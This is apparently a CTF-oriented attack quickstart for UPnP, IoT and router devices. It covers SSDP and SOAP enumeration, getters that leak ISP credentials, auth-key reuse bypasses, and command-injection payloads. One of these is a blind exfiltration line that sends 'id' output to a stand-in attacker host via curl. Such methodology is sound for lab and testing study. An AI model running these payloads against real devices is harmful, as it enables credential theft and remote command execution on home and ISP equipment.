# UPnP / IoT / CPE Quickstart

**Attack Type**: UPnP IGD / vendor SOAP enumeration → info disclosure → command injection
**MITRE**: T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter)

When the target speaks UPnP (TCP 1900/2869, or any HTTP service serving `/rootDesc.xml`, or hardware/IoT/CPE challenges), apply the following enumeration and exploitation discipline before reaching for hardware tools (UART/SPI/JTAG). "Hardware" CTF challenges frequently simulate the firmware web UI rather than physical hardware.

## Phase 1 — Discover and parse UPnP services

```bash
# Active discovery on a known HTTP port
curl -s "http://TARGET:PORT/rootDesc.xml"

# SSDP M-SEARCH on the LAN
python3 - <<'PY'
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
m = (b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
     b'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
s.sendto(m, ('239.255.255.250', 1900))
while True:
    try: print(s.recv(4096).decode())
    except: break
PY
```

In `rootDesc.xml`, list every `<service>`. Note the `<SCPDURL>` (action descriptor) and `<controlURL>` (SOAP endpoint) for each.

## Phase 2 — Read every SCPD (and the comments)

```bash
# For each SCPDURL listed in rootDesc.xml
curl -s "http://TARGET:PORT/SCPD_PATH.xml"
```

**Always read XML comments** — vendor SCPDs frequently include developer notes that disclose:
- Required auth headers and what generates them ("X-Diag-Key: ISP provisioning password")
- Sanitisation gaps ("TargetHost passed directly to shell. Sanitisation deferred to firmware X.Y.")
- Internal endpoints, debug actions, hidden parameters

For each `<action>`, classify by argument direction:
- Only `out` arguments → information getter, free to call
- Has `in` arguments of type `string` → command-injection / SSRF / path-traversal candidate

## Phase 3 — Information disclosure first (no auth needed)

Standard UPnP IGD getters routinely leak credentials in real CPEs and CTFs:

| Service | Action | Leaks |
|---------|--------|-------|
| `WANIPConnection:1` / `WANPPPConnection:1` | `GetUserName` | ISP/PPP username |
| `WANIPConnection:1` / `WANPPPConnection:1` | `GetPassword` | ISP/PPP cleartext password |
| `WANIPConnection:1` | `GetExternalIPAddress` | Public IP |
| `Layer3Forwarding:1` | `GetDefaultConnectionService` | Internal topology |
| `WANCommonInterfaceConfig:1` | `GetCommonLinkProperties` | Link type/speed |
| Vendor `*ConfigService` / `*ManagementService` | any `Get*` | varies — read every getter |

Generic SOAP envelope template:

```xml
<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
            s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:ACTION xmlns:u="SERVICE_TYPE_URN">
      <!-- in-arguments here -->
    </u:ACTION>
  </s:Body>
</s:Envelope>
```

```bash
curl -s -X POST "http://TARGET:PORT/CONTROL_URL" \
  -H 'Content-Type: text/xml; charset="utf-8"' \
  -H 'SOAPAction: "SERVICE_TYPE_URN#ACTION"' \
  --data-binary @envelope.xml
```

## Phase 4 — Vendor-extension actions are command-injection candidates

Any non-standard action accepting a `string` `in`-argument that smells like a hostname, URL, path, command, filename, or filter is a high-probability shell injection. Classics:

- `DiagnosticService` / `LANHostConfigManagement` style services
- Argument names: `TargetHost`, `Hostname`, `URL`, `Path`, `Filename`, `Filter`, `Cmd`, `Server`, `Address`

First-shot payloads (escalate as needed):

```text
127.0.0.1; id
127.0.0.1$(id)
127.0.0.1`id`
127.0.0.1|id
127.0.0.1%0aid                # newline if XML/HTTP layer reaches a CGI
$(id)
```

If output isn't reflected, use blind techniques (`; sleep 5`, `; curl http://attacker/$(id|base64)`).

## Phase 5 — Auth-key cross-action bypass

When a vendor action requires a "key" (e.g., `X-Diag-Key`, `X-Auth`, query `?token=`), check whether **any other action on the device returns a value that fits**. Common bypasses:

1. `WANIPConnection#GetPassword` returns the ISP password → re-use as `X-Diag-Key`
2. `DeviceConfig#GetSerial` returns serial that is also default admin password
3. SSDP USN or UDN UUIDs sometimes reused as session tokens

**Rule**: never trust a key whose source isn't itself authenticated.

## Real-world prior art

- D-Link DIR-* series: `WANIPConnection#GetPassword` cleartext leak
- Realtek SDK miniigd: SOAP command injection (CVE-2014-8361, CVE-2021-35394)
- Broadcom UPnP stack: stack overflow via SOAP (multiple)
- Conexant/Sercomm: hidden management actions in vendor SCPD

## Common Pitfalls

- Forgetting the `SOAPAction` header — UPnP servers reject without it
- Wrong namespace — must match the `serviceType` URN exactly
- HTML-encoded payloads in XML — use raw `;` and `&amp;` carefully (or wrap argument in `<![CDATA[...]]>`)
- Some servers normalise the controlURL — try `/`-prefixed and unprefixed forms
- "Hardware" CTF categories may serve the firmware UI on the docker port directly; HTTP recon first, hardware tooling only if HTTP shows nothing
